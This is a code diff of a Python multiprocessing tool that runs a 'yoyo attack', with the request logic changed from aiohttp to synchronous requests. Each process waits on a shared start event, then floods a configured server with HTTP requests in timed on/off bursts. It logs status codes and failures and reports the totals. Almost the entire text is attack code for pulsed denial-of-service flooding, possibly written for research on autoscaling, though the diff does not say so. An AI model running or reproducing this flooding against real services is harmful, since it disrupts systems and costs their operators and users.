@@ -1,13 +1,12 @@
-import asyncio
-import time
-from datetime import datetime
-import aiohttp
-from collections import OrderedDict
+import requests
 import multiprocessing as mp
+import time
+from collections import OrderedDict
 from .reporter import Reporter
+from datetime import datetime
 
 
-class Attacker(mp.Process):
+class AttackerSync(mp.Process):
 
     def __init__(self, config, start_attack_event, kill_event):
         super().__init__()
@@ -46,36 +45,23 @@ class Attacker(mp.Process):
         report = Reporter(self.name, total_requests, total_fail_requests, num_sessions)
         self._report_queue.put(report)
 
-    async def send_request(self, session):
-        async with session.request(self._request_method, self._server_dst, headers=self._request_headers, json=self._request_data, timeout=200) as resp:
-            status_code = resp.status
-            self.logger.debug(status_code)
-            if status_code != 200:
-                self._failed_sent_per_session[self._current_session_time] += 1
-            self._sent_per_session[self._current_session_time] += 1
-
-    async def send_requests(self, max_time):
+    def send_requests(self, max_time):
         st_time = time.time()
         end_time = st_time + max_time
-        sess = aiohttp.ClientSession()
-        tasks = []
+        statuses = []
         while time.time() < end_time and not self.kill:
-            tasks.append(asyncio.create_task(self.send_request(sess)))
-            await asyncio.sleep(self._wait_between_requests)
-        num_of_remained_tasks = len(list(filter(lambda t: not t.done(), tasks)))
-        self.logger.info(f"Canceling remained tasks ({num_of_remained_tasks} tasks)..")
-        list(map(lambda t: t.cancel(), tasks))
-        # await asyncio.wait(tasks)
-        # all_tasks_done = all(map(lambda t: t.done(), tasks))
-        # self.logger.debug(f"All tasks done: {all_tasks_done}")
-        tasks.append(asyncio.create_task(sess.close()))
+            req = requests.request(self._request_method, self._server_dst, headers=self._request_headers,
+                                   json=self._request_data)
+            self.logger.debug(req.status_code)
+            statuses.append(req.status_code)
+            time.sleep(self._wait_between_requests)
 
     def attack_on(self):
         self._current_session_time = datetime.now().strftime('%H:%m:%S')
         self._sent_per_session[self._current_session_time] = 0
         self._failed_sent_per_session[self._current_session_time] = 0
         self.logger.debug(f"start time: {datetime.now().strftime('%H:%m:%S')}")
-        asyncio.run(self.send_requests(self._time_on))
+        self.send_requests(self._time_on)
 
     def attack_off(self):
         st_time = time.time()
@@ -92,16 +78,16 @@ class Attacker(mp.Process):
 
     def yoyo_attack(self):
         self.logger.info("Starting yoyo attack..")
-        self._loop = asyncio.get_event_loop()
         num_sessions = 0
         self._start_attack_event.wait()  # wait for all processes to start
         while not self.kill:
             self.attack_session()
             num_sessions += 1
-        self._loop.close()
         self.logger.info("ending yoyo attack..")
         self.logger.debug(f"Total requests {self.total_requests}")
         self.send_report(self.total_requests, self.total_fail_requests, num_sessions)
 
     def run(self) -> None:
         self.yoyo_attack()
+
+
